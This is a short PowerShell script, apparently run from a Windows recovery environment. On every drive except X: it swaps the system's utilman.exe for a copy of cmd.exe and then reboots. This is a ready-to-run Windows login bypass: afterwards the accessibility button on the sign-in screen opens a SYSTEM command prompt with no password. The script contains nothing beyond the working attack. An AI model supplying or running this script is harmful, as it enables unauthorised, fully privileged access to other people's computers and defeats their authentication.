$targetPath = "\windows\system32\utilman.exe"
$replacementPath = "\windows\system32\cmd.exe"

# Get all disk letters excluding the specified drive letter
$diskLetters = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DeviceID -ne 'X:' } | Select-Object -ExpandProperty DeviceID

foreach ($letter in $diskLetters) {
    $utilmanPath = "$letter$targetPath"

    # Check if utilman.exe exists in the current disk
    if (Test-Path $utilmanPath) {
        # Rename utilman.exe to old_utilman.exe
        Rename-Item -Path $utilmanPath -NewName "old_utilman.exe" -Force

        # Copy cmd.exe to utilman.exe
        Copy-Item -Path "$letter$replacementPath" -Destination $utilmanPath -Force

        # Restart the PC
        Shutdown -r
    }
}
